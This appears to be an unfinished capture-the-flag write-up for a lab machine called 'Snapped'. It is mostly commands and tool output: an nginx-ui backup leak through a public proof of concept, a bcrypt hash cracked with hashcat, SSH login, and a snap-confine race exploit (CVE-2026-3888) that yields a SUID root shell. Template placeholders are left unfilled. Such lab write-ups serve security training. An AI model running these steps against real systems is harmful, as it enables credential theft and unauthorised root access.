
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sV -sC --open snapped.htb 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-11 09:34 EDT
Nmap scan report for snapped.htb (10.129.125.70)
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Snapped \xE2\x80\x94 Infrastructure. Orchestration. Control.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.74 seconds

```

### Service Enumeration

```
gobuster vhost -u http://snapped.htb -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -k --append-domain
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://snapped.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
admin.snapped.htb Status: 200 [Size: 1407]
Progress: 20000 / 20000 (100.00%)
===============================================================
Finished
===============================================================

```

added to the /etc/hosts.

---
## Foothold

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

poc: https://github.com/advisories/GHSA-g9w5-qffc-6762

```shell
python3 poc.py --target http://admin.snapped.htb --out backup.bin --decrypt                   

X-Backup-Security: I2BYayPDb79HJvt7XkOnOYpeqOpxx96Wk4atqrdhzcY=:dEr+E8UZbS0a7TTu9tq82Q==
Parsed AES-256 key: I2BYayPDb79HJvt7XkOnOYpeqOpxx96Wk4atqrdhzcY=
Parsed AES IV    : dEr+E8UZbS0a7TTu9tq82Q==

[*] Key length: 32 bytes (AES-256 ✓)
[*] IV length : 16 bytes (AES block size ✓)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt...
    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
    → Saved to backup_extracted/nginx-ui_decrypted.zip (7765 bytes)
    → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
    → Extracted 22 files to backup_extracted/nginx

[*] Hash info:
nginx-ui_hash: c5ec27f75aef9bf7861697d197964dbd8b327e354cfc111f54065f1abf7c9f13
nginx_hash: 9b17eb8d31e6dc4a120a28a1048cfc8bd816fff3f9beb05495306e02329a862d
timestamp: 20260911-111839
version: 2.3.2

```

```
sqlite3 database.db       
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE `migrations` (`id` text,PRIMARY KEY (`id`));
INSERT INTO migrations VALUES('202505120000001');
INSERT INTO migrations VALUES('20250405000001');
INSERT INTO migrations VALUES('20250405000002');
INSERT INTO migrations VALUES('20250706000001');
INSERT INTO migrations VALUES('20250812000001');
INSERT INTO migrations VALUES('20250812000002');
INSERT INTO migrations VALUES('20251209000002');
CREATE TABLE `config_backups` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`filepath` text,`content` text);
CREATE TABLE `users` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`password` text,`status` numeric DEFAULT true,`otp_secret` blob,`recovery_codes` text,`language` text DEFAULT "en");
INSERT INTO users VALUES(1,'2026-03-19 08:22:54.41011219-04:00','2026-03-19 08:39:11.562741743-04:00',NULL,'admin','$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm',1,NULL,replace('g�\n
                                                                                                                                                                                                      |�7�ĝ�*�:���(��\�D�O�}u#,�','\n',char(10)),'en');
INSERT INTO users VALUES(2,'2026-03-19 09:54:01.989628406-04:00','2026-03-19 09:54:01.989628406-04:00',NULL,'jonathan','$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq',1,NULL,',��զ�H�։��e)5U��Z��▒KĦ"D���W▒','en');
CREATE TABLE `auth_tokens` (`user_id` integer,`token` text,`short_token` text,`expired_at` integer DEFAULT 0);
CREATE TABLE `dns_credentials` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`config` text,`provider` text,`provider_code` text);
CREATE TABLE `acme_users` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`email` text,`ca_dir` text,`registration` text,`key` text,`proxy` text,`register_on_startup` numeric,`eab_key_id` text,`eabhmac_key` text);
CREATE TABLE `certs` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`domains` text,`filename` text,`ssl_certificate_path` text,`ssl_certificate_key_path` text,`auto_cert` integer,`challenge_method` text,`dns_credential_id` integer,`acme_user_id` integer,`key_type` text,`log` text,`resource` text,`sync_node_ids` text,`must_staple` numeric,`lego_disable_cname_support` numeric,`revoke_old` numeric);
CREATE TABLE `llm_sessions` (`id` integer PRIMARY KEY AUTOINCREMENT,`session_id` text NOT NULL,`title` text,`path` text,`messages` text,`message_count` integer,`is_active` numeric DEFAULT true,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime);
CREATE TABLE `namespaces` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`sync_node_ids` text,`order_id` integer DEFAULT 0,`post_sync_action` text DEFAULT "reload_nginx",`upstream_test_type` text DEFAULT "local",`deploy_mode` text DEFAULT "local");
CREATE TABLE `sites` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`path` text,`advanced` numeric,`namespace_id` integer,`sync_node_ids` text);
INSERT INTO sites VALUES(1,'2026-03-19 09:54:18.58184442-04:00','2026-03-19 09:54:18.58184442-04:00',NULL,'/etc/nginx/sites-available/default',0,0,NULL);
CREATE TABLE `streams` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`path` text,`advanced` numeric,`namespace_id` integer,`sync_node_ids` text);
CREATE TABLE `dns_domains` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`domain` text NOT NULL,`description` text,`dns_credential_id` integer NOT NULL,`ddns_config` text);
CREATE TABLE `nodes` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`url` text,`token` text,`enabled` numeric DEFAULT false);
CREATE TABLE `notifications` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`type` integer,`title` text,`content` text,`details` text);
CREATE TABLE `ban_ips` (`ip` text,`attempts` integer,`expired_at` integer);
INSERT INTO ban_ips VALUES('127.0.0.1',2,1789137388);
INSERT INTO ban_ips VALUES('127.0.0.1',1,1789138078);
CREATE TABLE `configs` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`filepath` text,`sync_node_ids` text,`sync_overwrite` numeric);
CREATE TABLE `passkeys` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text,`user_id` integer,`raw_id` text,`credential` text,`last_used_at` integer DEFAULT 0);
CREATE TABLE `external_notifies` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`type` text,`language` text,`config` text,`enabled` numeric DEFAULT true);
CREATE TABLE `auto_backups` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`name` text NOT NULL,`backup_type` text NOT NULL,`storage_type` text NOT NULL,`backup_path` text,`storage_path` text NOT NULL,`cron_expression` text NOT NULL,`enabled` numeric DEFAULT true,`last_backup_time` datetime,`last_backup_status` text DEFAULT "pending",`last_backup_error` text,`s3_endpoint` text,`s3_access_key_id` text,`s3_secret_access_key` text,`s3_bucket` text,`s3_region` text);
CREATE TABLE `site_configs` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`host` text,`port` integer,`scheme` text DEFAULT "http",`display_url` text,`custom_order` integer DEFAULT 0,`health_check_enabled` numeric DEFAULT true,`check_interval` integer DEFAULT 300,`timeout` integer DEFAULT 10,`user_agent` text DEFAULT "Nginx-UI Site Checker/1.0",`max_redirects` integer DEFAULT 3,`follow_redirects` numeric DEFAULT true,`check_favicon` numeric DEFAULT true,`health_check_config` text);
INSERT INTO site_configs VALUES(1,'2026-03-19 09:56:32.708588606-04:00','2026-03-19 09:56:32.708588606-04:00',NULL,'admin.snapped.htb:80',80,'http','http://admin.snapped.htb',0,1,300,10,'Nginx-UI Site Checker/1.0',3,1,1,NULL);
INSERT INTO site_configs VALUES(2,'2026-03-19 10:00:51.386532402-04:00','2026-03-19 10:00:51.386532402-04:00',NULL,'snapped.htb:80',80,'http','http://snapped.htb',0,1,300,10,'Nginx-UI Site Checker/1.0',3,1,1,NULL);
CREATE TABLE `nginx_log_indices` (`id` uuid,`created_at` datetime,`updated_at` datetime,`path` text NOT NULL,`main_log_path` text,`last_modified` datetime,`last_size` integer DEFAULT 0,`last_position` integer DEFAULT 0,`last_indexed` datetime,`index_start_time` datetime,`index_duration` integer,`time_range_start` datetime,`time_range_end` datetime,`document_count` integer DEFAULT 0,`enabled` numeric DEFAULT true,`index_status` text DEFAULT "not_indexed",`error_message` text,`error_time` datetime,`retry_count` integer DEFAULT 0,`queue_position` integer DEFAULT 0,PRIMARY KEY (`id`));
CREATE TABLE `upstream_configs` (`id` integer PRIMARY KEY AUTOINCREMENT,`created_at` datetime,`updated_at` datetime,`deleted_at` datetime,`socket` text,`enabled` numeric DEFAULT true);
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',2);
INSERT INTO sqlite_sequence VALUES('sites',1);
INSERT INTO sqlite_sequence VALUES('site_configs',2);
CREATE INDEX `idx_config_backups_deleted_at` ON `config_backups`(`deleted_at`);
CREATE INDEX `idx_users_deleted_at` ON `users`(`deleted_at`);
CREATE INDEX `idx_dns_credentials_provider_code` ON `dns_credentials`(`provider_code`);
CREATE INDEX `idx_dns_credentials_deleted_at` ON `dns_credentials`(`deleted_at`);
CREATE INDEX `idx_acme_users_deleted_at` ON `acme_users`(`deleted_at`);
CREATE INDEX `idx_certs_deleted_at` ON `certs`(`deleted_at`);
CREATE INDEX `idx_llm_sessions_deleted_at` ON `llm_sessions`(`deleted_at`);
CREATE INDEX `idx_llm_sessions_path` ON `llm_sessions`(`path`);
CREATE UNIQUE INDEX `idx_llm_sessions_session_id` ON `llm_sessions`(`session_id`);
CREATE INDEX `idx_namespaces_deleted_at` ON `namespaces`(`deleted_at`);
CREATE UNIQUE INDEX `idx_sites_path` ON `sites`(`path`);
CREATE INDEX `idx_sites_deleted_at` ON `sites`(`deleted_at`);
CREATE UNIQUE INDEX `idx_streams_path` ON `streams`(`path`);
CREATE INDEX `idx_streams_deleted_at` ON `streams`(`deleted_at`);
CREATE UNIQUE INDEX `idx_dns_domain_credential` ON `dns_domains`(`domain`,`dns_credential_id`);
CREATE INDEX `idx_dns_domains_deleted_at` ON `dns_domains`(`deleted_at`);
CREATE INDEX `idx_nodes_deleted_at` ON `nodes`(`deleted_at`);
CREATE INDEX `idx_notifications_deleted_at` ON `notifications`(`deleted_at`);
CREATE INDEX `idx_ban_ips_expired_at` ON `ban_ips`(`expired_at`);
CREATE INDEX `idx_configs_deleted_at` ON `configs`(`deleted_at`);
CREATE INDEX `idx_passkeys_deleted_at` ON `passkeys`(`deleted_at`);
CREATE INDEX `idx_external_notifies_language` ON `external_notifies`(`language`);
CREATE INDEX `idx_external_notifies_type` ON `external_notifies`(`type`);
CREATE INDEX `idx_external_notifies_deleted_at` ON `external_notifies`(`deleted_at`);
CREATE INDEX `idx_auto_backups_enabled` ON `auto_backups`(`enabled`);
CREATE INDEX `idx_auto_backups_storage_type` ON `auto_backups`(`storage_type`);
CREATE INDEX `idx_auto_backups_backup_type` ON `auto_backups`(`backup_type`);
CREATE INDEX `idx_auto_backups_deleted_at` ON `auto_backups`(`deleted_at`);
CREATE INDEX `idx_site_configs_port` ON `site_configs`(`port`);
CREATE INDEX `idx_site_configs_host` ON `site_configs`(`host`);
CREATE INDEX `idx_site_configs_deleted_at` ON `site_configs`(`deleted_at`);
CREATE INDEX `idx_nginx_log_indices_main_log_path` ON `nginx_log_indices`(`main_log_path`);
CREATE UNIQUE INDEX `idx_nginx_log_indices_path` ON `nginx_log_indices`(`path`);
CREATE UNIQUE INDEX `idx_upstream_configs_socket` ON `upstream_configs`(`socket`);
CREATE INDEX `idx_upstream_configs_deleted_at` ON `upstream_configs`(`deleted_at`);
COMMIT;

```

keep only relevant output. (aka jonatan hash)

Cracking the hash:

```
hashcat -m 3200 '$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq'  /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-10310U CPU @ 1.70GHz, 1469/2939 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (990 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2...oCSyWq
Time.Started.....: Fri Sep 11 11:14:18 2026 (20 secs)
Time.Estimated...: Fri Sep 11 11:14:38 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       26 H/s (4.42ms) @ Accel:2 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 504/14344385 (0.00%)
Rejected.........: 0/504 (0.00%)
Restore.Point....: 500/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: turtle -> claire
Hardware.Mon.#01.: Util: 97%

Started: Fri Sep 11 11:13:23 2026
Stopped: Fri Sep 11 11:14:39 2026

```

credentials: `jonathan:linkinpark`

ssh access as jonathan:

```
ssh jonathan@snapped.htb                           
The authenticity of host 'snapped.htb (10.129.125.70)' can't be established.
ED25519 key fingerprint is: SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'snapped.htb' (ED25519) to the list of known hosts.
jonathan@snapped.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5
jonathan@snapped:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  user.txt  Videos
jonathan@snapped:~$ 

```

```
jonathan@snapped:~$ cat user.txt
679f0fb79b998f6e993c37df043fd7e1 cnsor
```

---
## Privilege Escalation

### Enumeration

```
jonathan@snapped:~/.local/share$ find / -perm -4000 2>/dev/null
/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core22/1564/usr/bin/chfn
/snap/core22/1564/usr/bin/chsh
/snap/core22/1564/usr/bin/gpasswd
/snap/core22/1564/usr/bin/mount
/snap/core22/1564/usr/bin/newgrp
/snap/core22/1564/usr/bin/passwd
/snap/core22/1564/usr/bin/su
/snap/core22/1564/usr/bin/sudo
/snap/core22/1564/usr/bin/umount
/snap/core22/1564/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/1564/usr/lib/openssh/ssh-keysign
/snap/core22/1564/usr/libexec/polkit-agent-helper-1
/usr/bin/passwd
/usr/bin/fusermount3
/usr/bin/umount
/usr/bin/vmware-user-suid-wrapper
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd

```

```
jonathan@snapped:~$ snap version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic

```

```
jonathan@snapped:~$ which busybox (used to check for the cve requirements)
/usr/bin/busybox
```

CVE 2026-3888
Local privilege escalation in snapd on Linux allows local attackers to get root privilege by re-creating snap's private /tmp directory when systemd-tmpfiles is configured to automatically clean up this directory. This issue affects Ubuntu 16.04 LTS, 18.04 LTS, 20.04 LTS, 22.04 LTS, and 24.04 LTS.
### Exploitation

poc: https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.git

```shell
gcc -O2 -static -o exploit exploit_suid.c
```

```
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
```

The files are then transferred to the target host

```
python3 -m http.server 9002                     
Serving HTTP on 0.0.0.0 port 9002 (http://0.0.0.0:9002/) ...
10.129.126.88 - - [12/Sep/2026 05:46:35] "GET /exploit HTTP/1.1" 200 -
10.129.126.88 - - [12/Sep/2026 05:46:56] "GET /librootshell.so HTTP/1.1" 200 -
```

```
jonathan@snapped:~$ chmod +x exploit && chmod +x librootshell.so
```

```
jonathan@snapped:~$ ./exploit ./librootshell.so
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell.so (9056 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 4108

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
[+] .snap deleted.

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_U7v65y//dev: No such file or directory
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/4108/cwd
[*]   Building .snap and .exchange...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 4199)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[*]   ld-linux in namespace: jonathan:jonathan 755
[+]   Poisoned namespace PID: 4199

[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[*]   Planting busybox...
[*]   Writing escape script → /tmp/sh
[*]   Overwriting ld-linux-x86-64.so.2...
[+]   Payload injected.

[Phase 6] Triggering root via SUID snap-confine...
[*]   snap-confine → snap-confine (SUID trigger)
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================

bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
```

### Root flag

```
bash-5.1# cat /root/root.txt
f895b9ebd14df064757fc61cb4f87d1b censor the flag
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)